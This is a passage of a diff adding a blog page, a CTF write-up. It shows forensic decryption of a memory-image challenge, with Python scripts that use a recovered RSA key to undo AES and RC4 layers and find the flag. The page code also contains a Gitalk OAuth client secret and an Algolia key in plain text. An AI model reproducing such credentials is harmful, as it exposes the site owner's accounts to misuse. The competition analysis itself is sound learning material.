+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;userid&#39;</span><span class="p">:</span> <span class="n">userid</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">name</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;idcard&#39;</span><span class="p">:</span> <span class="n">data_dict</span><span class="p">[</span><span class="s1">&#39;idcard&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;phone&#39;</span><span class="p">:</span> <span class="n">data_dict</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;error_field&#39;</span><span class="p">:</span> <span class="s1">&#39;phone&#39;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;未找到 </span><span class="si">{</span><span class="n">userid</span><span class="si">}</span><span class="s2"> 对应的公钥&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">altered_file</span> <span class="o">=</span> <span class="s1">&#39;altered_data.csv&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">altered_file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">newline</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">csvfile</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fieldnames</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;userid&#39;</span><span class="p">,</span> <span class="s1">&#39;name&#39;</span><span class="p">,</span> <span class="s1">&#39;idcard&#39;</span><span class="p">,</span> <span class="s1">&#39;phone&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">writer</span> <span class="o">=</span> <span class="n">csv</span><span class="o">.</span><span class="n">DictWriter</span><span class="p">(</span><span class="n">csvfile</span><span class="p">,</span> <span class="n">fieldnames</span><span class="o">=</span><span class="n">fieldnames</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">writer</span><span class="o">.</span><span class="n">writeheader</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">altered_data</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">writer</span><span class="o">.</span><span class="n">writerow</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;userid&#39;</span><span class="p">:</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;userid&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;name&#39;</span><span class="p">:</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;idcard&#39;</span><span class="p">:</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;idcard&#39;</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;phone&#39;</span><span class="p">:</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;phone&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span></code></pre></div><p>得到结果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154548008-1029325857.png" alt="image-20250303154543898"></p>
+<h2 id="easyrawencode">
+<a class="header-anchor" href="#easyrawencode"></a>
+easyrawencode
+</h2><p>附件是给raw，进行取证</p>
+<p>发现了有对data.csv加密的过程</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154600208-1219564800.png" alt="image-20250303154556229"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154605461-737943410.png" alt="image-20250303154601264"></p>
+<p>所用到的私钥</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154611496-176615729.png" alt="image-20250303154607584"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154616444-716431259.png" alt="image-20250303154612070"></p>
+<p>查看注册表，找到<code>hackkey</code>的值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154623214-908780775.png" alt="image-20250303154619153"></p>
+<p>查看console的执行过程，发现有执行结果</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154628433-1202187935.png" alt="image-20250303154624437"></p>
+<p>分析脚本，用的AES对内容进行的加密，那就编写脚本对其进行解密</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span><span class="p">,</span> <span class="n">PKCS1_OAEP</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">enckey</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;20d96098010eb9b326be6c46e1ce1ca679e29f1d65dec055cf8c46c6436c3356af2dc312b2d35466308b9fff0dd427b44a37e34fca12992e45db2ddd81884bd8eb5bccd3c595e8a9a352bd61322e1d52329d6c8638bbfce65edffbc4d3a5759e88c0f90e31ce518837552a3a09d8e7e3c374f3857bfe501cce2066fb233ff1f5faac18d73c3b665a54e8c55574f16bf4678c5ce835d2a14a65f8c1cec012435a8c06314cbe727a3a9b6060dfd6cdb850073423841178f6f409bb7ce8d4863c6f58855954d34af3d2964c488c9057c8c5072a54e43f1f8039d32409eb1ff3abca41c0b302788c4c56c1a4be4506ff5b8aff0242e21c0ee7ffee2da20ed9434334&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">nonce</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;d919c229aab6535efa09a52c589c8f47&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tag</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;5b204675b1b173c32c04b0b8a100ee29&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 读取私钥</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;pri.pem&#39;</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">pri_key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">import_key</span><span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 读取加密数据</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;encrypted_data.bin&#39;</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">enc_data</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用RSA私钥解密AES密钥</span>
+</span></span><span class="line"><span class="cl"><span class="n">de_rsa</span> <span class="o">=</span> <span class="n">PKCS1_OAEP</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">pri_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">aes_key_decrypted</span> <span class="o">=</span> <span class="n">de_rsa</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enckey</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;RSA解密AES密钥失败：&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">raise</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 使用解密后的AES密钥解密文件数据</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">de_aes</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">aes_key_decrypted</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_EAX</span><span class="p">,</span> <span class="n">nonce</span><span class="o">=</span><span class="n">nonce</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">de_aes</span><span class="o">.</span><span class="n">decrypt_and_verify</span><span class="p">(</span><span class="n">enc_data</span><span class="p">,</span> <span class="n">tag</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">ValueError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;AES解密失败或验证失败：&#34;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">raise</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 将解密后的数据写入文件</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;decrypted_data.csv&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;Successfully decrypted data&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>解开得到csv，发现最后一列是加密的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154635827-1568790526.png" alt="image-20250303154631694"></p>
+<p>个人签名是用的RC4加密的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154640984-1813266908.png" alt="image-20250303154637019"></p>
+<p>写脚本解密，找到flag</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pandas</span> <span class="k">as</span> <span class="nn">pd</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">ARC4</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">pd</span><span class="o">.</span><span class="n">read_csv</span><span class="p">(</span><span class="s1">&#39;decrypted_data.csv&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">index</span><span class="p">,</span> <span class="n">row</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">iterrows</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;个性签名(加密版)&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">password</span> <span class="o">=</span> <span class="n">row</span><span class="p">[</span><span class="s1">&#39;密码&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">enc_de_base64</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rc4</span> <span class="o">=</span> <span class="n">ARC4</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">password</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="n">de_rc4</span> <span class="o">=</span> <span class="n">rc4</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">enc_de_base64</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s2">&#34;DASCTF{&#34;</span> <span class="ow">in</span> <span class="n">de_rc4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;得到结果:</span><span class="si">{</span><span class="n">de_rc4</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20250303154650065-1805009670.png" alt="image-20250303154646135"></p></div>
+    <footer class="article-footer"><ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in">
+      <a
+        class="article-tag-list-link"
+        href="/tags/ctf"
+        rel="tag"
+        >CTF</a
+      >
+    </li></ul>
+</footer>
+  </div><nav
+    id="article-nav"
+    aria-label="Article navigation"
+    data-aos="fade-up"
+  ><div class="article-nav-link-wrap left"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_18.webp"
+              data-sizes="auto"
+              alt="2024 CISCN X 长城杯铁人三项 初赛"
+              class="lazyload"
+            /><a
+          href="/post/2024-ciscn-x-%E9%95%BF%E5%9F%8E%E6%9D%AF%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9-%E5%88%9D%E8%B5%9B/"
+          aria-label="前一篇:2024 CISCN X 长城杯铁人三项 初赛"
+          title="前一篇:2024 CISCN X 长城杯铁人三项 初赛"
+        ></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">2024 CISCN X 长城杯铁人三项 初赛</h3>
+      </div><div class="article-nav-link-wrap right"><img
+              data-src="https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/covers/default_cover_99.webp"
+              data-sizes="auto"
+              alt="HTB Escape"
+              class="lazyload"
+            /><a
+          href="/post/htb-escape/"
+          aria-label="后一篇:HTB Escape"
+          title="后一篇:HTB Escape"
+        ></a>
+        <div class="article-nav-caption">后一篇</div>
+        <h3 class="article-nav-title">HTB Escape</h3>
+      </div></nav></article><section id="comments" data-aos="fade-up">
+<div class="comment-header"><h2 class="comment-title">说些什么吧！</h2>
+  <div class="comment-selector">
+    <div class="comment-selector-wrap"><div class="selector-item" data-selector="gitalk">
+          <span>gitalk</span>
+        </div></div>
+  </div>
+</div>
+
+<div class="comment-content"><div class="comment gitalk-comment" data-aos="fade-up"
+     id="gitalk-comment">
+    </div></div>
+</section></section>
+        </div><footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info"><div>
+      <span class="icon-copyright"></span>2025<span class="footer-info-sep rotate"></span>
+      Ya1orin
+    </div><div>
+        基于&nbsp;<a
+          href="https://gohugo.io/"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Hugo</a
+        >&nbsp; Theme.<a
+          href="https://github.com/D-Sketon/hugo-theme-reimu"
+          target="_blank"
+          rel="noopener nofollow noreferrer"
+          >Reimu</a
+        >
+      </div><div>
+        <span class="icon-brush"
+          >&nbsp;97.1k</span
+        >
+        &nbsp;|&nbsp;
+        <span class="icon-coffee">&nbsp;03:38</span>
+      </div><div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv"
+          >总访问量&nbsp;<span
+            id="busuanzi_value_site_pv"
+          ></span
+        ></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv"
+          >总访客量&nbsp;<span
+            id="busuanzi_value_site_uv"
+          ></span
+        ></span>
+      </div></div>
+</footer>
+<div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div><div id="mask" class="hide"></div>
+      </div><nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap"><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#签到">签到</a>
+      <ul>
+        <li><a href="#欢迎来到第八届西湖论剑大赛">欢迎来到第八届西湖论剑大赛</a></li>
+      </ul>
+    </li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#rank-l">Rank-l</a></li>
+        <li><a href="#sqli-or-not">sqli or not</a></li>
+        <li><a href="#rank-u">Rank-U</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a></li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#vpwn">Vpwn</a></li>
+        <li><a href="#heavens-door">Heaven&rsquo;s door</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#matrixrsa">matrixRSA</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#糟糕的磁盘">糟糕的磁盘</a></li>
+      </ul>
+    </li>
+    <li><a href="#iot">IoT</a>
+      <ul>
+        <li><a href="#blink">blink</a></li>
+        <li><a href="#sharkp">sharkp</a></li>
+      </ul>
+    </li>
+    <li><a href="#ds">DS</a>
+      <ul>
+        <li><a href="#easydatalog">easydatalog</a></li>
+        <li><a href="#dsasignaturedata">DSASignatureData</a></li>
+        <li><a href="#easyrawencode">easyrawencode</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="Ya1orin"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">Ya1orin</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">43</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      3
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">37</div>
+  </a>
+</div>
+<div class="sidebar-social"><div class="icon-github sidebar-social-icon">
+      <a
+        href="https://github.com/ya1orin"
+        itemprop="url"
+        target="_blank"
+        aria-label="github"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div>
+<div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/friend"
+        aria-label="友链"
+      ></a>
+      <div class='sidebar-menu-icon icon rotate'>&#xe62b;</div>
+      <div class="sidebar-menu-link">友链</div>
+    </div></div>
+</div></div><div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div></nav>
+</div><div class="site-search">
+        <div class="reimu-popup popup">
+          <div class="reimu-search">
+            <div class="reimu-search-input-icon"></div>
+            <div id="reimu-search-input"></div>
+            <div class="popup-btn-close"></div>
+          </div>
+          <div class="reimu-results">
+            <div id="reimu-stats"></div>
+            <div id="reimu-hits"></div>
+            <div id="reimu-pagination" class="reimu-pagination"></div>
+          </div>
+          <img class="reimu-bg" src="/images/reimu.png" />
+        </div>
+      </div><script
+    src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"
+    integrity="sha384-3gT/vsepWkfz/ff7PpWNUeMzeWoH3cDhm/A8jM7ouoAK0/fP/9bcHHR5kHq2nf&#43;e" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"
+    integrity="sha384-J08i8An/QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script><script src="/js/main.js" ></script><script src="/js/aos.js" ></script><script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === "loading") {
+      document.addEventListener("DOMContentLoaded", aosInit);
+    } else {
+      aosInit();
+    }
+  </script><script src="/js/pjax_main.js" data-pjax></script><script>
+    var ALGOLIA_CONFIG = {
+      logo: '\/images\/algolia_logo.svg',
+      algolia: {
+        applicationID: "G5DS5ZI3YM",
+        apiKey: "90bf1b7c38d7240c582e5c8a29bff9ab",
+        indexName: "Blog",
+        hits: {
+          "per_page": parseInt("10")
+        },
+        labels: {
+          "input_placeholder": '搜索.....',
+          "hits_empty": '未发现与 「${query}」相关内容',
+          "hits_stats": '找到${hits}条结果（用时 ${time} ms）'
+        }
+      }
+    };
+  </script><script
+    src="https://npm.webcache.cn/algoliasearch@4.17.1/dist/algoliasearch-lite.umd.js"
+    deferintegrity="sha384-xvLS0jfKuoREs7pqkRI/OI8GcqohO5S&#43;jQz7ZBtQXnsXmD&#43;9jDOOY4cL6dCPzlrk" crossorigin="anonymous"></script><script
+    src="https://npm.webcache.cn/@reimujs/instantsearch.js@4.57.0-beta.1/dist/instantsearch.production.min.js"
+    deferintegrity="sha384-aagKMe8nkqaP2DYQc8kkYOL5l&#43;M5Q2WH/Uhr4teOh0Ybp0RZj0kUSDm45qPikMjK" crossorigin="anonymous"></script><script src="/js/algolia_search.js" ></script><script
+    src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js"
+    integrity="sha384-8LyaidD9GPxQQgLJO/WRw/O2h3BoNq/ApI/ecpvM6RsrCz2qP2ppBXUKihP4V/2d" crossorigin="anonymous"></script><script>
+  if (! false  || !window.matchMedia('(max-width: 768px)').matches) {
+    if (window.firework) {
+      const options = JSON.parse("{\"excludeelements\":[\"a\",\"button\"],\"particles\":[{\"colors\":[\"var(--red-1)\",\"var(--red-2)\",\"var(--red-3)\",\"var(--red-4)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"emit\"],\"number\":20,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.3,0.5],\"radius\":[16,32]}},{\"colors\":[\"var(--red-0)\"],\"duration\":[1200,1800],\"easing\":\"easeOutExpo\",\"move\":[\"diffuse\"],\"number\":1,\"shape\":\"circle\",\"shapeOptions\":{\"alpha\":[0.2,0.5],\"lineWidth\":6,\"radius\":20}}]}");
+      options.excludeElements = options.excludeelements;
+      delete options.excludeelements;
+      window.firework(options);
+    }
+  }
+</script>
+
+<div id="lazy-script">
+  <div><script data-pjax>
+        window.REIMU_POST = {
+          author: "Ya1orin",
+          title: "第八届西湖论剑 初赛",
+          url: "http:\/\/localhost:1313\/post\/%E7%AC%AC%E5%85%AB%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-%E5%88%9D%E8%B5%9B\/",
+          description: "第八届西湖论剑 初赛 WriteUp By 金石滩小鲨鱼",
+          cover: "http:\/\/localhost:1313\/images\/banner.webp",
+        };
+      </script><script src="/js/insert_highlight.js" data-pjax></script><script type="module" data-pjax>const PhotoSwipeLightbox = (await safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js", "sha384-DiL6M\/gG\u002bwmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF\/N6lrZi\/")).default;const initPswp = (gallery, children) => {
+          if (_$$(`${gallery} ${children}`).length > 0) {
+            new PhotoSwipeLightbox({
+              gallery,
+              children,pswpModule: () => safeImport("https:\/\/npm.webcache.cn\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8\u002boTJ7m3DfYEWX1fu1scuS4\u002bs")}).init();
+          }
+        }
+        const pswp = () => {
+          initPswp('.article-entry', 'a.article-gallery-item');
+          initPswp('.article-gallery', 'a.article-gallery-item');
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script><script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+  var commentConfigKeys = ['valine', 'waline', 'twikoo', 'gitalk', 'giscus'];
+  var commentConfig = {gitalk: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.gitalk-comment');
+        if (!container) return;
+        container.style.display = 'block';
+
+        const script = loadScript(
+          'https:\/\/npm.webcache.cn\/gitalk@1.8.0\/dist\/gitalk.min.js',
+          !'webcache|gitalk@1.8.0\/dist\/gitalk.min.js'.startsWith('local') ? 'sha384-kspnZUWBoSWwoJHa0hBCXYbHGbhvU\/lcEH5O8eVbSDhbPwsiVUTp\/aGX\/z\/5EuMA' : undefined
+        );
+        script.onload = () => {
+          if ( false ) {
+            
+            const md5Script = loadScript(
+              'https:\/\/npm.webcache.cn\/blueimp-md5@2.19.0\/js\/md5.min.js',
+              !'webcache|blueimp-md5@2.19.0\/js\/md5.min.js'.startsWith('local') ? 'sha384-JmVtRz6RWiXnA14QbIOJzPuU3MidULOpBP66deeLLyyoF4Tr\/gZlbkHkL6vTthxH' : undefined
+            );
+            md5Script.onload = initGitalk;
+            document.head.appendChild(md5Script);
+          } else {
+            
+            initGitalk();
+          }
+        };
+        document.head.appendChild(script);
+
+        function initGitalk() {
+          let gitalk = new Gitalk({
+            clientID: 'Ov23li64Bz4egFDpBVAa',
+            clientSecret: 'ff0e7ea9d99ed40adbfcb4bf88ff2b95918d9dd7',
+            repo: 'Blog-comment',
+            owner: 'Ya1orin',
+            admin: JSON.parse("\"Ya1orin\""),
+            id: location.pathname,
+            distractionFreeMode: false,
+            language: document.documentElement.lang || 'en',
+          });
+          gitalk.render('gitalk-comment');
+        }
+      }
+    },};
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig?.[key]?.enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      var configDefault = 'gitalk';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig?.[sys]?.enable) || '';
+    }
+  }
+
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
